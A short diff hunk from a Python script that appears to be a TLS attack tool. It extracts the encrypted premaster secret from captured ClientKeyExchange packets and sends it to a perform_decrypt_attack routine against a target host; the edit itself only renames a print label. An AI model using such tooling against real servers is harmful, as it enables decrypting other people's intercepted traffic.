@@ -45,7 +45,8 @@ def process_packet(packet):
         print("Found Client key exchange")
         length = int.from_bytes(raw[9:11], "big")
         enc_premaster_secret = raw[11:11+length]
-        print("enc_premaster_secret: " + str(to_hex(enc_premaster_secret)))
+        print("Encrypted premaster secret: " + str(to_hex(enc_premaster_secret)))
+
         dec_premaster_secret_data = perform_decrypt_attack(args.host, args.port, enc_premaster_secret, 5, False)
         dec_premaster_secret = int.to_bytes(dec_premaster_secret_data, sys.getsizeof(dec_premaster_secret_data), "big")[-96:]
         dec_premaster_secret = int.from_bytes(dec_premaster_secret, "big")
